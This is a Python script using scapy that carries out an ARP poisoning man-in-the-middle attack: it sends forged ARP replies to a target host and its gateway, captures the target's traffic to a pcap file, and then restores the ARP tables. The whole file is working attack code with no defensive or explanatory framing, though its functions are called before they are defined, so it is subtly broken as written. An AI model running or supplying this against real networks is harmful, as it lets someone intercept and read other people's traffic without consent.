from scapy.all import ARP, getmacbyip, conf, send, sniff, wrpcap
import os
import sys
import threading
import signal
import time


interface = ""
target_ip = ""
gateway_ip = ""
packet_count = 1000

conf.iface = interface
conf.verb = 0

print(f"[*] Setting up {interface}")

gateway_mac = getmacbyip(gateway_ip)
if gateway_mac is None:
    print("[!!!] Failed to get gateway MAC. Exiting.")
    sys.exit(0)
else:
    print(f"[*] Gateway {gateway_ip} is at {gateway_mac}")

target_mac = getmacbyip(target_ip)
# Verificar retorno em caso de não existir o IP
if target_mac is None:
    print("[!!!] Failed to get target MAC. Exiting.")
    sys.exit(0)
else:
    print(f"[*] Target {target_ip} is at {target_mac}")

poison_thread = threading.Thread(
    target = poison_target, 
    args = (
        gateway_ip, 
        gateway_mac,
        target_ip,
        target_mac
    )
)
poison_thread.start()

try:
    print(f"[*] Starting sniffer for {packet_count} packets")
    bpf_filter = f"ip host {target_ip}"
    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)
    # salvar captura
    wrpcap('arper.pcap',packets)
    # restaurar a rede
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

except KeyboardInterrupt:
    # restore the network
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    sys.exit(0)


def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    # slightly different method using send
    print("[*] Restoring target...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
    # signals the main thread to exit
    os.kill(os.getpid(), signal.SIGINT)

def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    # Verificar possibilidade de montagem dos pacotes a uma
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst= target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst= gateway_mac

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
        
    print("[*] ARP poison attack finished.")
    return
